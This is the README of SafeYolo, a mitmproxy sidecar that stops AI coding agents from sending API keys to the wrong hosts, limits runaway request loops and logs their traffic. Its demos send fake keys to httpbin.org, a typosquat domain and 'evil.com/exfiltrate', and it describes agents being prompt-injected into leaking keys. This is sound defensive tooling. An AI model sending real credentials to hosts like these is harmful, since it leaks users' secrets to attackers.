# SafeYolo

**Guardrails for "YOLO mode" coding agents.**

You sandboxed your coding agent to protect your machine. Now protect your keys when it hallucinates endpoints.

SafeYolo is a mitmproxy-based sidecar that prevents credential leakage, dampens runaway loops, and provides audit logs for agent HTTP/tool calls.

---

## Quick Start (30 seconds)

```bash
# Get SafeYolo running
git clone https://github.com/craigbalding/safeyolo
cd safeyolo
docker compose up -d

# Test it blocks credential leakage (fake key to httpbin.org)
curl -x http://localhost:8888 \
  -H "Authorization: Bearer sk-test1234567890abcdefghijklmnopqrstuvwxyz123456" \
  https://httpbin.org/get
# → 403 Blocked by credential-guard

# Check what happened
curl http://localhost:9090/stats | jq
```

Your fake OpenAI key was blocked from reaching httpbin.org.

**Watch logs in real-time:**
```bash
# Live log monitoring with colored output and 5-second summaries
docker logs -f safeyolo 2>&1 | python scripts/logtail.py
```

**Next steps:**
- Add your API providers to `config/credential_rules.json` (patterns + allowed hosts, not actual keys)
- Adjust rate limits in `config/rate_limits.json` if needed
- Point your coding agent at `http://localhost:8888` as its proxy
- [See detailed setup for Claude Code](#use-case-claude-code-sidecar)

---

## Block-by-Default for Core Protections

SafeYolo runs in **block mode by default** for credential guard and rate limiting - violations are blocked immediately to prevent credential leakage and runaway loops. This is safe because:
- **Credential guard scans headers only by default** - extremely low false positive rate
- **Rate limits are generous** - 10 req/sec default, 50 req/sec for LLM APIs (600+ requests/min)
- **Easy to disable for development** - `--set credguard_block=false --set ratelimit_block=false`

Other security addons (pattern_scanner in base, prompt_injection and yara_scanner in extended) default to warn-only mode for gradual rollout.

## Choosing Your Image

SafeYolo has three build targets:

**Base (default, ~200MB)** - Core addons only, recommended for most users
```bash
docker compose up -d  # Uses base target
```
Includes: credential_guard, rate_limiter, circuit_breaker, pattern_scanner (regex), policy, metrics, admin_api

**Extended (~700MB)** - Adds ML + YARA for advanced detection
```bash
# Edit docker-compose.yml: change target to 'extended'
docker compose up -d
```
Adds: prompt_injection (experimental ML classifier), yara_scanner (enterprise pattern matching)

**Dev** - Development and testing environment
```bash
docker build --target dev -t safeyolo:dev .
```
Includes all extended addons plus pytest, ipython, and tools for model export/testing. For contributors only.

**Why separate?** Most teams just need credential protection and rate limiting. ML models add ~500MB for experimental prompt injection detection that generates many false positives. Only use if you're prepared to tune it for your workload.

## Key Features

- **Credential routing** - API keys only go to authorized hosts (OpenAI key -> api.openai.com only)
- **Domain defense** - Blocks typosquats (`api.openal.com`) and homograph attacks (`api.оpenai.com` with Cyrillic 'о')
- **Runaway loop dampening** - Per-domain rate limiter + circuit breaker
- **Auditability** - JSONL logs, Prometheus metrics, admin API on :9090

## Who It's For

- Solo developers using coding agents daily
- Small teams running agents in CI
- Security-conscious teams needing egress policy + audit trails

**Questions?** Built by [craig@threatspotting.com](mailto:craig@threatspotting.com) · If you need an independent view on controls and evidence visit [safeyolo.com](https://safeyolo.com/#help)

## Safety Net, Not a Firewall

SafeYolo catches accidents and obvious attacks at the network layer. It won't stop a sophisticated attacker, but it will catch problems from LLM hallucinations, typosquatted domains, and copy-paste errors.

---

## Why SafeYolo Exists (optional reading)

*Already running SafeYolo and want to understand the philosophy? Read on. Otherwise, [skip to demos](#5-minute-demo).*

### Design Philosophy

### The Problem: Agents Are Untrusted Insiders

We've built identity controls, zero-trust networks, and least-privilege access. But AI coding agents introduce a new challenge: whether you're vibe coding or running serious dev workflows, your agent ends up with project API keys - yet makes decisions based on statistical patterns, not deterministic logic you can audit or predict.

When you give Claude Code your OpenAI API key and say "build me a chat app," you're handing credentials to a system that might hallucinate `api.openai.com` as `api.openal.com`. Or get prompt-injected into sending your keys to an attacker's server.

**How many API keys have already leaked this way?** After context window compaction, an agent loses details and starts guessing service URLs. We've seen production API keys leak when agents tried authenticating to the wrong host - infrastructure management via API is powerful, but dangerous when the agent loses context about service URLs. `api.service-provider.com` vs `api.serviceprovider.com`, or worse, completely wrong domains. No error, no warning, just credentials sent to someone else's server. In YOLO mode, you'd never know until you see unexpected charges or security incidents.

This is a new threat model: *untrusted insiders* - systems you want to use, but shouldn't fully trust with unrestricted network access.

### The Missing Layer: Network Security

We sandbox the filesystem (containers). We limit CPU and memory (cgroups). But we give AI agents unrestricted internet access with production credentials. The network layer was missing.

SafeYolo is egress control for the API economy:
- Credentials only reach authorized destinations
- Runaway loops get dampened before they blacklist your IP
- Every HTTP request is logged
- The agent gets clear feedback when blocked

### Trust, But Verify

Use AI agents with intentional constraints:
- **Block credential leakage and runaway loops by default** - these cause immediate, measurable damage
- **Make exceptions easy** - temp allowlist, admin API, runtime mode toggling
- **LLM-friendly error messages** - the agent learns from blocks, not just fails silently
- **Catch accidents, not APTs** - Focus on hallucinations, typosquats, and configuration errors, not sophisticated attacks

### What Gets Logged

Every request generates a JSONL entry with method, host, path, status, latency, and which addon (if any) blocked it. Metrics track per-domain request counts, error rates, and block sources. You know what your agent is doing.

---

*SafeYolo adds the missing network security layer for AI coding agents. Containers protect your filesystem. SafeYolo protects your API keys and downstream services.*

---

## Threat Model

### What SafeYolo helps with:

- **Hallucinated endpoints** - Model misremembers `api.openai.com` as `api.openal.com`
- **Credential exfil via tool calls** - Prompt injection tricks model into sending keys to wrong host
- **Runaway loops** - LLM gets stuck making 1000 API calls per second
- **Audit trails** - You need to know what your agent actually did

### What SafeYolo does NOT do:

- Detect prompt injection reliably (experimental addon with high false positive rate)
- Replace app-layer authentication or authorization
- Inspect streamed/huge response bodies (>10MB are passed through)
- Stop attacks that don't go through the proxy

---

## 5-Minute Demo

### Quick Start

```bash
cd safeyolo
docker compose up -d

# Test basic proxy
curl -x http://localhost:8888 https://httpbin.org/ip

# Check admin API
curl http://localhost:9090/health
curl http://localhost:9090/stats

# Attach to mitmproxy TUI
docker exec -it safeyolo tmux attach
# Detach with Ctrl-B, D
```

### Demo 1: Credential Routing Detection

```bash
# OpenAI key pattern going to wrong host - detected as violation
curl -x http://localhost:8888 \
  -H "Authorization: Bearer sk-abcd1234567890abcd1234567890abcd1234567890abcdef" \
  https://httpbin.org/get

# In warn mode (default): Request succeeds, but violation logged
# Check the log:
tail -1 logs/safeyolo.jsonl | jq .

# To enable blocking:
curl -X PUT http://localhost:9090/modes \
  -H "Content-Type: application/json" \
  -d '{"mode": "block"}'

# Now the same request returns 403 with credential routing error
```

### Demo 2: Typosquat Detection

```bash
# Typosquat of openai.com - detected as credential routing violation
curl -x http://localhost:8888 \
  -H "Authorization: Bearer sk-abcd1234567890abcd1234567890abcd1234567890abcdef" \
  https://api.openal.com/v1/chat

# In warn mode: Request attempts to reach destination (likely fails - domain doesn't exist)
# In block mode: 403 blocked by credential-guard before reaching destination
```

### Demo 3: Rate Limiter

```bash
# Fire 10 rapid requests - rate limiter kicks in
for i in {1..10}; do
  curl -x http://localhost:8888 -s -o /dev/null -w "%{http_code}\n" \
    https://httpbin.org/get
done

# Expected: First few return 200, then 429 (rate limited)
```

### If mitmproxy crashes

```bash
# Check the startup log
docker exec safeyolo cat /app/logs/mitmproxy.log
```

---

## Architecture

SafeYolo runs mitmproxy with a chain of native addons (9 in base, 11 in extended):

```
┌─────────────────────────────────────────────────────────────────┐
│                           SafeYolo                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Request flow (9 base addons + 2 extended):                     │
│                                                                 │
│  ┌──────────────────┐                                           │
│  │     policy       │ -> Unified config [config/policy.yaml]    │
│  └────────┬─────────┘                                           │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │service_discovery │ -> Docker container auto-discovery        │
│  └────────┬─────────┘                                           │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │  rate_limiter    │ -> Per-domain GCRA config/rate_limits.json│
│  └────────┬─────────┘    Outbound rate limiing active by default│
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │circuit_breaker   │ -> Fail-fast for unhealthy upstreams      │
│  └────────┬─────────┘    Always active                          │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │ credential_guard │ -> Block keys to wrong hosts              │
│  └────────┬─────────┘    config/credential_rules.json           │
│           │              HTTP header detection by default       │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │  yara_scanner    │ -> YARA rules [extended build only]       │
│  └────────┬─────────┘    Warn mode by default                   │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │ pattern_scanner  │ -> Fast regex for secrets/jailbreaks      │
│  └────────┬─────────┘    Warn mode by default                   │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │prompt_injection  │ -> ML classifier [extended build only]    │
│  └────────┬─────────┘    Warn mode by default                   │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │ request_logger   │ -> JSONL structured logging               │
│  └────────┬─────────┘                                           │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │    metrics       │ -> Per-domain stats (Prometheus/JSON)     │
│  └────────┬─────────┘                                           │
│           ▼                                                     │
│  ┌──────────────────┐                                           │
│  │   admin_api      │ -> REST API on :9090                      │
│  └────────┬─────────┘                                           │
│           ▼                                                     │
│       Upstream                                                  │
└─────────────────────────────────────────────────────────────────┘
```

Each addon is a standalone Python file using mitmproxy's addon API. No framework, no abstraction layer - just `request()` and `response()` hooks on `http.HTTPFlow` objects.

---

## Addons

SafeYolo includes 11 addons for security, reliability, and observability: 9 in the base build (~200MB), plus 2 optional addons in the extended build (~700MB). Each addon is a standalone Python file using mitmproxy's addon API.

**For detailed documentation**, see [docs/ADDONS.md](docs/ADDONS.md).

| Addon | Build | Description | Config File | Default Mode |
|-------|-------|-------------|-------------|--------------|
| **policy.py** | Base | Unified policy engine - controls which addons run on which domains/clients | `config/policy.yaml` | Always active |
| **service_discovery.py** | Base | Auto-discovers Docker containers on internal network for routing decisions | Options only | Always active |
| **rate_limiter.py** | Base | Per-domain rate limiting using GCRA - prevents IP blacklisting from runaway loops | `config/rate_limits.json` | **Block** (10 rps default, 50 for LLM APIs) |
| **circuit_breaker.py** | Base | Fail-fast for unhealthy upstreams - stops hammering services that are down | Options only | Always active (blocks when open) |
| **credential_guard.py** | Base | **Flagship security** - blocks API keys to unauthorized hosts (typosquats, prompt injection exfiltration) | `config/credential_rules.json` | **Block** (headers-only scanning) |
| **pattern_scanner.py** | Base | Fast regex scanning - lightweight detection of common secrets and jailbreak phrases | Built-in patterns | Warn only |
| **request_logger.py** | Base | JSONL structured logging for all requests - audit trail and debugging | Options only | Always active |
| **metrics.py** | Base | Per-domain statistics in JSON and Prometheus formats - monitoring and alerting | Options only | Always active |
| **admin_api.py** | Base | REST API on port 9090 - runtime control, mode switching, stats, allowlist management | Options only | Always active |
| **yara_scanner.py** | Extended | Enterprise pattern matching - scans for credentials, jailbreaks, PII using YARA rules | `config/yara_rules/` | Warn only |
| **prompt_injection.py** | Extended | **Experimental** - ML classifier for prompt injection detection (high false positive rate, needs tuning) | Options only | Warn only |

### Quick Examples

**Credential Guard** - Blocks OpenAI key to wrong host:
```bash
curl -x http://localhost:8888 \
  -H "Authorization: Bearer sk-test1234567890abcdefghijklmnopqrstuvwxyz123456" \
  https://evil.com/exfiltrate
# → 403 CREDENTIAL ROUTING ERROR
```

**Rate Limiter** - Prevents runaway loops:
```bash
# LLM tries 100 req/sec to api.openai.com
# After burst (100 requests), returns 429 with Retry-After header
```

**Circuit Breaker** - Fails fast when service is down:
```bash
# api.example.com returns 5 consecutive 500s
# Circuit opens → immediate 503 for 60 seconds
# After timeout → allows 3 test requests → auto-recovers if healthy
```

**Admin API** - Switch modes at runtime:
```bash
# Disable blocking for development
curl -X PUT http://localhost:9090/plugins/credential-guard/mode \
  -d '{"mode": "warn"}'

# Enable blocking for prompt injection
curl -X PUT http://localhost:9090/plugins/prompt-injection/mode \
  -d '{"mode": "block"}'
```

**See [docs/ADDONS.md](docs/ADDONS.md) for complete reference** - configuration options, use cases, response formats, and examples for all addons (9 base + 2 extended).

---

## Use Case: Claude Code Sidecar

SafeYolo's primary use case is as an internet chokepoint for AI coding assistants:

```
┌─────────────────────────────────────────────────────┐
│                    Host Machine                     │
└─────────────────────────────────────────────────────┘
                           │
              ┌────────────┴────────────┐
              │    safeyolo-internal    │
              │       (network)         │
              └────────────┬────────────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
        ▼                  ▼                  ▼
┌───────────────┐  ┌───────────────┐  ┌───────────────┐
│ Claude Code   │  │   Project     │  │   SafeYolo    │
│  (no direct   │  │  Container    │  │   (proxy)     │
│   internet)   │  │               │  │               │
└───────────────┘  └───────────────┘  └───────┬───────┘
                                              │
                                         Internet
```

Claude Code routes all traffic through SafeYolo, which:
- Blocks credential leakage to wrong domains
- Rate limits to prevent IP blacklisting
- Circuit breaks failing services
- Logs everything for audit
- Allows legitimate API calls through

### Setup Option 1: Claude Code in a Container (Recommended)

**If you run Claude Code in Docker**, join the SafeYolo network:

```yaml
# docker-compose.yml for your coding environment
services:
  claude-code:
    # ... your existing config ...
    networks:
      safeyolo-internal:
        ipv4_address: 172.30.0.20
    volumes:
      - safeyolo-certs:/certs:ro
    environment:
      # Route all traffic through SafeYolo
      - HTTP_PROXY=http://172.30.0.10:8080
      - HTTPS_PROXY=http://172.30.0.10:8080
      - http_proxy=http://172.30.0.10:8080
      - https_proxy=http://172.30.0.10:8080
      # Trust mitmproxy CA cert for HTTPS inspection
      - NODE_EXTRA_CA_CERTS=/certs/mitmproxy-ca-cert.pem
      - SSL_CERT_FILE=/certs/mitmproxy-ca-cert.pem
      - REQUESTS_CA_BUNDLE=/certs/mitmproxy-ca-cert.pem

networks:
  safeyolo-internal:
    external: true

volumes:
  safeyolo-certs:
    external: true
```

### Setup Option 2: Claude Code on Host Machine

**If you run Claude Code directly on your host**, set proxy environment variables:

```bash
# Add to ~/.bashrc or ~/.zshrc
export HTTP_PROXY=http://localhost:8888
export HTTPS_PROXY=http://localhost:8888

# Install mitmproxy CA cert (one-time setup)
# Linux:
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates

# macOS:
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.mitmproxy/mitmproxy-ca-cert.pem
```

**Then start Claude Code** - all traffic now routes through SafeYolo.

---

## Large Response Streaming

By default, mitmproxy buffers entire responses before passing them through addons. This can cause OOM crashes on large downloads (e.g., 200MB podcast files).

SafeYolo enables `stream_large_bodies=10m` - responses over 10MB are streamed without buffering.

**Security tradeoff:** Streamed responses bypass body inspection. We accept this because:
- 10MB threshold is high enough to scan most text-based responses (LLM outputs, API responses, logs)
- Large binary files (podcasts, videos, model weights) rarely contain scannable secrets
- Pattern/regex scanning 500MB+ files is expensive and low-signal
- The alternative is OOM crashes on legitimate large downloads

**If you need to scan large responses:** Lower the threshold or disable streaming entirely (may cause OOM on media downloads):
```bash
# Edit scripts/start-safeyolo.sh
MITM_OPTS="${MITM_OPTS} --set stream_large_bodies=50m"  # Higher threshold
MITM_OPTS="${MITM_OPTS} --set stream_large_bodies=0"    # Disable streaming (scan everything)
```

---

## Reloading Addons

To pick up addon code changes without full container restart:

```bash
docker exec safeyolo /app/scripts/reload-mitmproxy.sh
```

**How it works:** At startup, `start-safeyolo.sh` saves the full mitmproxy command to `/tmp/mitmproxy-cmd.sh`. The reload script stops mitmproxy and re-runs that exact command. This ensures reload always matches the startup configuration - no duplicated config to maintain.

For config file changes (policy.yaml, rate_limits.json, credential_rules.json), most addons hot-reload automatically. Check individual addon docs.

**Important: Runtime settings are reset on restart.** Any changes made via the admin API (warn/block modes, temp allowlists) are in-memory only. On restart, SafeYolo returns to its startup defaults:
- All security addons start in warn-only mode (unless `SAFEYOLO_BLOCK=true` is set)
- Temp allowlist entries are cleared

If you need blocking mode to persist across restarts, set `SAFEYOLO_BLOCK=true` in your docker-compose.yml or environment.

---

## Running Without Docker

```bash
# Install deps
pip install mitmproxy httpx yara-python pyyaml aiodocker

# Run with addons
mitmproxy -p 8080 \
  -s addons/policy.py \
  -s addons/service_discovery.py \
  -s addons/rate_limiter.py \
  -s addons/circuit_breaker.py \
  -s addons/credential_guard.py \
  -s addons/yara_scanner.py \
  -s addons/pattern_scanner.py \
  -s addons/request_logger.py \
  -s addons/metrics.py \
  -s addons/admin_api.py \
  --set policy_file=config/policy.yaml \
  --set ratelimit_config=config/rate_limits.json \
  --set credguard_rules=config/credential_rules.json \
  --set safeyolo_log_path=logs/safeyolo.jsonl \
  --set admin_port=9090 \
  --set stream_large_bodies=10m
```

---

## Writing Custom Addons

SafeYolo addons are just mitmproxy addons. Here's the pattern:

```python
from mitmproxy import ctx, http

class MyAddon:
    name = "my-addon"

    def load(self, loader):
        """Register options."""
        loader.add_option(
            name="myaddon_enabled",
            typespec=bool,
            default=True,
            help="Enable my addon",
        )

    def request(self, flow: http.HTTPFlow):
        """Called for each request."""
        # Check policy first
        from addons.policy import get_policy_engine
        policy = get_policy_engine()
        if policy and not policy.is_addon_enabled(self.name, flow):
            return  # Disabled by policy

        if should_block(flow):
            flow.response = http.Response.make(403, b"Blocked")
            flow.metadata["blocked_by"] = self.name

    def response(self, flow: http.HTTPFlow):
        """Called for each response."""
        pass

# mitmproxy discovers this
addons = [MyAddon()]
```

Key patterns:
- Use `flow.metadata` for inter-addon communication
- Set `flow.metadata["blocked_by"]` when blocking (logger picks it up)
- Check policy before processing if you want per-domain control
- Register options via `load()` for runtime config
- Access options via `ctx.options.your_option`

**Shared utilities** in `addons/utils.py`:
```python
from .utils import write_jsonl, make_block_response

# Structured JSONL logging
write_jsonl(self.log_path, "my_event", log, domain=host, details="...")

# Standard JSON block response with X-Blocked-By header
flow.response = make_block_response(
    403,
    {"error": "Blocked", "reason": "..."},
    self.name,
    {"X-Custom-Header": "value"},  # optional extra headers
)
```

See mitmproxy docs: https://docs.mitmproxy.org/stable/addons-overview/

---

## Files

```
safeyolo/
├── addons/                    # Native mitmproxy addons (11 total)
│   ├── utils.py               # Shared utilities (logging, responses)
│   ├── sse_streaming.py       # SSE/streaming response handler
│   ├── policy.py              # Unified policy engine
│   ├── service_discovery.py   # Docker container discovery
│   ├── rate_limiter.py        # Per-domain rate limiting (GCRA)
│   ├── circuit_breaker.py     # Fail-fast for unhealthy upstreams
│   ├── credential_guard.py    # API key protection
│   ├── yara_scanner.py        # YARA threat detection (extended)
│   ├── pattern_scanner.py     # Regex scanning for secrets/jailbreaks
│   ├── prompt_injection.py    # ML classification (extended, experimental)
│   ├── request_logger.py      # JSONL structured logging
│   ├── metrics.py             # Per-domain statistics
│   └── admin_api.py           # REST API on :9090
├── config/
│   ├── policy.yaml            # Per-domain/client addon config
│   ├── credential_rules.json  # Credential patterns + allowed hosts
│   ├── rate_limits.json       # Per-domain rate limits
│   └── yara_rules/            # YARA rules (extended build)
│       ├── default.yar        # Default threat detection rules
│       └── README.md          # YARA rule documentation
├── scripts/
│   ├── start-safeyolo.sh      # Docker entrypoint
│   ├── test_build.sh          # Build target testing (base/extended/dev)
│   ├── logtail.py             # Live log viewer with summaries
│   ├── export_piguard_onnx.py # Export PIGuard model to ONNX
│   └── test_*.py              # Classifier evaluation scripts
├── models/
│   └── piguard-onnx/          # PIGuard ONNX model files
│       ├── config.json        # Model configuration
│       ├── modeling_piguard.py # Custom model code
│       ├── tokenizer_config.json
│       └── special_tokens_map.json
├── tests/                     # Pytest test suite (168 tests)
│   ├── conftest.py            # Fixtures and setup
│   ├── test_credential_guard.py
│   ├── test_rate_limiter.py
│   ├── test_circuit_breaker.py
│   ├── test_pattern_scanner.py
│   ├── test_policy.py
│   ├── test_prompt_injection.py
│   ├── test_admin_api.py
│   └── test_integration.py
├── docs/
│   ├── ADDONS.md              # Complete addon reference
│   ├── FUTURE.md              # Ideas under consideration
│   └── prompt-injection-classifier-evaluation.md
├── Dockerfile                 # Multi-stage: base/extended/dev
├── docker-compose.yml
├── LICENSE                    # MIT License
└── README.md
```

**Running tests:**
```bash
# In Docker
docker exec -it safeyolo python -m pytest tests/ -v

# Locally (requires mitmproxy installed)
cd safeyolo && python -m pytest tests/ -v
```

---

## License & Attribution

SafeYolo is released under the **MIT License**. See [LICENSE](LICENSE) for details.

**Built with [mitmproxy](https://mitmproxy.org/)** - SafeYolo is based on mitmproxy's addon architecture but is not affiliated with or endorsed by the mitmproxy project.
